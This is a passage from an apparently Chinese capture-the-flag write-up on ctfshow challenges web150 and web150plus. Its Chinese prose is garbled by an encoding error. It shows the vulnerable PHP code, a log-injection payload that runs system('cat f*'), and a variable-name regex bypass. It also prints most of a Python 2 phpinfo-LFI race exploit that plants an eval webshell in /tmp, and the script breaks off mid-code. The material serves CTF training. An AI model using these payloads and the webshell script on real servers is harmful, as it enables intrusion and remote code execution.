</span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">class_exists</span><span class="p">(</span><span class="nv">$__CTFSHOW__</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;class is exists!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">
</span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$isVIP</span> <span class="o">&amp;&amp;</span> <span class="nx">strrpos</span><span class="p">(</span><span class="nv">$ctf</span><span class="p">,</span> <span class="s2">&#34;:&#34;</span><span class="p">)</span><span class="o">===</span><span class="k">FALSE</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$ctf</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜å­˜åœ¨éé¢„æœŸï¼Œå¯ä»¥é€šè¿‡extractå˜é‡è¦†ç›–ä½¿isVIP=trueï¼Œæ¥ç€è¿›è¡Œæ—¥å¿—æ³¨å…¥</p>
<p><img alt="image-20250124231951262" loading="lazy" src="assets/image-20250124231951262.png"></p>
<p>æˆ–è€…</p>
<p><img alt="image-20250126151004338" loading="lazy" src="./assets/image-20250126151004338.png"></p>
<p>æŠŠé©¬å†™åˆ°æ—¥å¿—é‡Œ</p>
<p>payload:</p>
<pre tabindex="0"><code>GET ?isVIP=true&amp;1=system(&#39;cat f*&#39;);
POST ctf=/var/log/nginx/access.log
</code></pre><h4 id="web150plus">web150plus<a hidden class="anchor" aria-hidden="true" href="#web150plus">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-19 07:12:57
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">class</span> <span class="nc">CTFSHOW</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">private</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">private</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">private</span> <span class="nv">$vip</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">private</span> <span class="nv">$secret</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">vip</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">secret</span> <span class="o">=</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">secret</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">isVIP</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">vip</span><span class="o">?</span><span class="k">TRUE</span><span class="o">:</span><span class="k">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">function</span> <span class="nf">__autoload</span><span class="p">(</span><span class="nv">$class</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$class</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="nv">$class</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">
</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="c1">#è¿‡æ»¤å­—ç¬¦
</span></span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="c1"></span><span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\_| |\[|\]|\?/&#39;</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctf&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">class_exists</span><span class="p">(</span><span class="nv">$__CTFSHOW__</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;class is exists!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">
</span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$isVIP</span> <span class="o">&amp;&amp;</span> <span class="nx">strrpos</span><span class="p">(</span><span class="nv">$ctf</span><span class="p">,</span> <span class="s2">&#34;:&#34;</span><span class="p">)</span><span class="o">===</span><span class="k">FALSE</span> <span class="o">&amp;&amp;</span> <span class="nx">strrpos</span><span class="p">(</span><span class="nv">$ctf</span><span class="p">,</span><span class="s2">&#34;log&#34;</span><span class="p">)</span><span class="o">===</span><span class="k">FALSE</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$ctf</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜banæ‰äº†éé¢„æœŸè§£ æ—¥å¿—æ³¨å…¥çš„æ–¹æ³•</p>
<p>é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“__autoloadæ–¹æ³•çš„ä½œç”¨</p>
<ul>
<li><code>__autoload()</code>ï¼šè‡ªåŠ¨åŠ è½½å‡½æ•°ï¼Œå½“ä½¿ç”¨æœªå®šä¹‰çš„ç±»æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥å‡½æ•°ã€‚å¦‚æœ<code>$class</code>å˜é‡å·²è®¾ç½®ï¼Œåˆ™å°†å…¶ä½œä¸ºå‡½æ•°è°ƒç”¨ã€‚</li>
</ul>
<p>è€Œä¸”è¿™é¢˜çš„__autoloadå¹¶ä¸åœ¨ç±»CTFSHOWä¸­ï¼ˆéšœçœ¼æ³•ï¼‰</p>
<p><img alt="image-20250126154119464" loading="lazy" src="./assets/image-20250126154119464.png"></p>
<p>è¿™ä¸ªç±»åœ¨isVIPåé¢å·²ç»ç»“æŸäº†</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡</p>
<pre tabindex="0"><code>if(class_exists($__CTFSHOW__)){
    echo &#34;class is exists!&#34;;
}
</code></pre><p>è°ƒç”¨ä»»æ„çš„ç±»</p>
<p>æˆ‘ä»¬å¯ä»¥æ ¹æ®phpä¼šå°†.è§£ææˆ_çš„ç‰¹æ€§ç»•è¿‡æ­£åˆ™</p>
<pre tabindex="0"><code>GET ?..CTFSHOW..=phpinfo
</code></pre><p><img alt="image-20250126154411534" loading="lazy" src="./assets/image-20250126154411534.png"></p>
<p>ç”±äºåŸé¢˜éœ€è¦ç«äº‰æ‰€ä»¥åé¢å°±ç›´æ¥æŠŠflagæ”¾ç¯å¢ƒå˜é‡äº†</p>
<p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥åœ¨phpinfoé‡Œé¢æ‰¾å°±è¡Œ</p>
<p><strong>åŸé¢˜è§£æ³•</strong>
æ‹¿åˆ°phpinfoæˆ‘ä»¬å°±å¯ä»¥getshelläº†</p>
<blockquote>
<p>PHP LFIæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¸»è¦æ˜¯åŒ…å«æœ¬åœ°æœåŠ¡å™¨ä¸Šå­˜å‚¨çš„ä¸€äº›æ–‡ä»¶ï¼Œä¾‹å¦‚sessionæ–‡ä»¶ã€æ—¥å¿—æ–‡ä»¶ã€ä¸´æ—¶æ–‡ä»¶ç­‰ã€‚ä½†æ˜¯ï¼Œåªæœ‰æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶åŒ…å«çš„æ–‡ä»¶å­˜å‚¨æˆ‘ä»¬çš„æ¶æ„ä»£ç æ‰èƒ½æ‹¿åˆ°æœåŠ¡å™¨æƒé™ã€‚å‡å¦‚åœ¨æœåŠ¡å™¨ä¸Šæ‰¾ä¸åˆ°æˆ‘ä»¬å¯ä»¥åŒ…å«çš„æ–‡ä»¶ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡åˆ©ç”¨ä¸€äº›æŠ€å·§è®©æœåŠ¡å­˜å‚¨æˆ‘ä»¬æ¶æ„ç”Ÿæˆçš„ä¸´æ—¶æ–‡ä»¶ï¼Œè¯¥ä¸´æ—¶æ–‡ä»¶åŒ…å«æˆ‘ä»¬æ„é€ çš„çš„æ¶æ„ä»£ç ï¼Œæ­¤æ—¶æœåŠ¡å™¨å°±å­˜åœ¨æˆ‘ä»¬å¯ä»¥åŒ…å«çš„æ–‡ä»¶äº†ã€‚å¦‚æœç›®æ ‡ç½‘ç«™ä¸Šå­˜åœ¨phpinfoï¼Œåˆ™å¯ä»¥é€šè¿‡phpinfoæ¥è·å–ä¸´æ—¶æ–‡ä»¶åï¼Œè¿›è€Œè¿›è¡ŒåŒ…å«ã€‚
åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/qq_63701832/article/details/129337902</p></blockquote>
<blockquote>
<p>è¿‡ç¨‹
1.å‘é€åŒ…å«äº†webshellçš„ä¸Šä¼ æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œè¿™ä¸ªæ•°æ®åŒ…çš„headerã€getç­‰ä½ç½®éœ€è¦å¡æ»¡åƒåœ¾æ•°æ®</p>
<p>2.phpinfoé¡µé¢ä¼šå°†æ‰€æœ‰æ•°æ®éƒ½æ‰“å°å‡ºæ¥ï¼Œ1ä¸­çš„åƒåœ¾æ•°æ®ä¼šå°†æ•´ä¸ªphpinfoé¡µé¢æ’‘å¾—éå¸¸å¤§</p>
<p>3.phpé»˜è®¤çš„è¾“å‡ºç¼“å†²åŒºå¤§å°ä¸º4096ï¼Œå¯ä»¥ç†è§£ä¸ºphpæ¯æ¬¡è¿”å›4096ä¸ªå­—èŠ‚ç»™socketè¿æ¥</p>
<p>4.æ“ä½œåŸç”Ÿsocketï¼Œæ¯æ¬¡è¯»å–4096ä¸ªå­—èŠ‚ã€‚åªè¦è¯»å–åˆ°çš„å­—ç¬¦é‡ŒåŒ…å«ä¸´æ—¶æ–‡ä»¶åï¼Œå°±ç«‹å³å‘é€ç¬¬äºŒä¸ªæ•°æ®åŒ…</p>
<p>5.æ­¤æ—¶ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…çš„socketè¿æ¥å®é™…ä¸Šè¿˜æ²¡ç»“æŸï¼Œå› ä¸ºphpè¿˜åœ¨ç»§ç»­æ¯æ¬¡è¾“å‡º4096ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ä¸´æ—¶æ–‡ä»¶æ­¤æ—¶è¿˜æ²¡æœ‰åˆ é™¤</p>
<p>6.åˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼Œå‘ç¬¬äºŒä¸ªæ•°æ®åŒ…ï¼Œå³å¯æˆåŠŸåŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œæœ€ç»ˆgetshell</p>
<p>å¤„ç†
PHP å¯¹ enctype=&ldquo;multipart/form-data&quot;è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹å¦‚ä¸‹ï¼š
1ã€è¯·æ±‚åˆ°è¾¾ï¼›
2ã€åˆ›å»ºä¸´æ—¶æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯/tmp/php[6 ä¸ªéšæœºå­—ç¬¦]ï¼‰ï¼Œå¹¶å†™å…¥ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ï¼›
3ã€è°ƒç”¨ç›¸åº” PHP è„šæœ¬è¿›è¡Œå¤„ç†ï¼Œå¦‚æ ¡éªŒåç§°ã€å¤§å°ç­‰ï¼›
4ã€åˆ é™¤ä¸´æ—¶æ–‡ä»¶ã€‚
æ€»ç»“
php post ä¸Šä¼ æ–‡ä»¶äº§ç”Ÿä¸´æ—¶æ–‡ä»¶ï¼Œphpinfoè¯»ä¸´æ—¶æ–‡ä»¶çš„è·¯å¾„å’Œåå­—ï¼Œæœ¬åœ°åŒ…å«åç”Ÿæˆåé—¨
åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/qq_63701832/article/details/129337902</p></blockquote>
<p>å¤§ä½¬çš„è„šæœ¬ï¼Œä½†æ˜¯æ˜¯python2çš„</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">  1</span><span class="cl"><span class="ch">#!/usr/bin/python </span>
</span></span><span class="line"><span class="ln">  2</span><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="ln">  3</span><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="ln">  4</span><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="ln">  5</span><span class="cl"> 
</span></span><span class="line"><span class="ln">  6</span><span class="cl"><span class="k">def</span> <span class="nf">setup</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">  7</span><span class="cl">    <span class="n">TAG</span><span class="o">=</span><span class="s2">&#34;Security Test&#34;</span>
</span></span><span class="line"><span class="ln">  8</span><span class="cl">    <span class="n">PAYLOAD</span><span class="o">=</span><span class="s2">&#34;&#34;&#34;</span><span class="si">%s</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln">  9</span><span class="cl"><span class="s2">&lt;?php file_put_contents(&#39;/tmp/g&#39;, &#39;&lt;?=eval($_REQUEST[1])?&gt;&#39;)?&gt;</span><span class="se">\r</span><span class="s2">&#34;&#34;&#34;</span> <span class="o">%</span> <span class="n">TAG</span>
</span></span><span class="line"><span class="ln"> 10</span><span class="cl">    <span class="n">REQ1_DATA</span><span class="o">=</span><span class="s2">&#34;&#34;&#34;-----------------------------7dbff1ded0714</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 11</span><span class="cl"><span class="s2">Content-Disposition: form-data; name=&#34;dummyname&#34;; filename=&#34;test.txt&#34;</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 12</span><span class="cl"><span class="s2">Content-Type: text/plain</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 13</span><span class="cl"><span class="s2"></span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 14</span><span class="cl"><span class="s2"></span><span class="si">%s</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 15</span><span class="cl"><span class="s2">-----------------------------7dbff1ded0714--</span><span class="se">\r</span><span class="s2">&#34;&#34;&#34;</span> <span class="o">%</span> <span class="n">PAYLOAD</span>
</span></span><span class="line"><span class="ln"> 16</span><span class="cl">    <span class="n">padding</span><span class="o">=</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">5000</span>
</span></span><span class="line"><span class="ln"> 17</span><span class="cl">    <span class="n">REQ1</span><span class="o">=</span><span class="s2">&#34;&#34;&#34;POST /06/phpinfo.php?a=&#34;&#34;&#34;</span><span class="o">+</span><span class="n">padding</span><span class="o">+</span><span class="s2">&#34;&#34;&#34; HTTP/1.1</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 18</span><span class="cl"><span class="s2">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&#34;&#34;&#34;</span><span class="o">+</span><span class="n">padding</span><span class="o">+</span><span class="s2">&#34;&#34;&#34;</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 19</span><span class="cl"><span class="s2">HTTP_ACCEPT: &#34;&#34;&#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="s2">&#34;&#34;&#34;</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 20</span><span class="cl"><span class="s2">HTTP_USER_AGENT: &#34;&#34;&#34;</span><span class="o">+</span><span class="n">padding</span><span class="o">+</span><span class="s2">&#34;&#34;&#34;</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 21</span><span class="cl"><span class="s2">HTTP_ACCEPT_LANGUAGE: &#34;&#34;&#34;</span><span class="o">+</span><span class="n">padding</span><span class="o">+</span><span class="s2">&#34;&#34;&#34;</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 22</span><span class="cl"><span class="s2">HTTP_PRAGMA: &#34;&#34;&#34;</span><span class="o">+</span><span class="n">padding</span><span class="o">+</span><span class="s2">&#34;&#34;&#34;</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 23</span><span class="cl"><span class="s2">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 24</span><span class="cl"><span class="s2">Content-Length: </span><span class="si">%s</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 25</span><span class="cl"><span class="s2">Host: </span><span class="si">%s</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 26</span><span class="cl"><span class="s2"></span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 27</span><span class="cl"><span class="s2"></span><span class="si">%s</span><span class="s2">&#34;&#34;&#34;</span> <span class="o">%</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">REQ1_DATA</span><span class="p">),</span><span class="n">host</span><span class="p">,</span><span class="n">REQ1_DATA</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 28</span><span class="cl">    <span class="c1">#modify this to suit the LFI script   </span>
</span></span><span class="line"><span class="ln"> 29</span><span class="cl">    <span class="n">LFIREQ</span><span class="o">=</span><span class="s2">&#34;&#34;&#34;GET /06/lfi.php?file=</span><span class="si">%s</span><span class="s2"> HTTP/1.1</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 30</span><span class="cl"><span class="s2">User-Agent: Mozilla/4.0</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 31</span><span class="cl"><span class="s2">Proxy-Connection: Keep-Alive</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 32</span><span class="cl"><span class="s2">Host: </span><span class="si">%s</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 33</span><span class="cl"><span class="s2"></span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 34</span><span class="cl"><span class="s2"></span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 35</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 36</span><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">REQ1</span><span class="p">,</span> <span class="n">TAG</span><span class="p">,</span> <span class="n">LFIREQ</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 37</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 38</span><span class="cl"><span class="k">def</span> <span class="nf">phpInfoLFI</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">phpinforeq</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">lfireq</span><span class="p">,</span> <span class="n">tag</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 39</span><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 40</span><span class="cl">    <span class="n">s2</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 41</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 42</span><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 43</span><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 44</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 45</span><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">phpinforeq</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 46</span><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 47</span><span class="cl">    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">offset</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 48</span><span class="cl">        <span class="n">d</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 49</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 50</span><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&#34;[tmp_name] =&amp;gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 51</span><span class="cl">        <span class="n">fn</span> <span class="o">=</span> <span class="n">d</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">17</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">31</span><span class="p">]</span>
</span></span><span class="line"><span class="ln"> 52</span><span class="cl">    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 53</span><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="ln"> 54</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 55</span><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">lfireq</span> <span class="o">%</span> <span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="n">host</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 56</span><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="n">s2</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 57</span><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 58</span><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 59</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 60</span><span class="cl">    <span class="k">if</span> <span class="n">d</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">tag</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 61</span><span class="cl">        <span class="k">return</span> <span class="n">fn</span>
</span></span><span class="line"><span class="ln"> 62</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 63</span><span class="cl"><span class="n">counter</span><span class="o">=</span><span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 64</span><span class="cl"><span class="k">class</span> <span class="nc">ThreadWorker</span><span class="p">(</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 65</span><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 66</span><span class="cl">        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 67</span><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">event</span> <span class="o">=</span> <span class="n">e</span>
</span></span><span class="line"><span class="ln"> 68</span><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">lock</span> <span class="o">=</span>  <span class="n">l</span>
</span></span><span class="line"><span class="ln"> 69</span><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">maxattempts</span> <span class="o">=</span> <span class="n">m</span>
</span></span><span class="line"><span class="ln"> 70</span><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">args</span> <span class="o">=</span> <span class="n">args</span>
</span></span><span class="line"><span class="ln"> 71</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 72</span><span class="cl">    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 73</span><span class="cl">        <span class="k">global</span> <span class="n">counter</span>
</span></span><span class="line"><span class="ln"> 74</span><span class="cl">        <span class="k">while</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">event</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 75</span><span class="cl">            <span class="k">with</span> <span class="bp">self</span><span class="o">.</span><span class="n">lock</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 76</span><span class="cl">                <span class="k">if</span> <span class="n">counter</span> <span class="o">&gt;=</span> <span class="bp">self</span><span class="o">.</span><span class="n">maxattempts</span><span class="p">:</span>
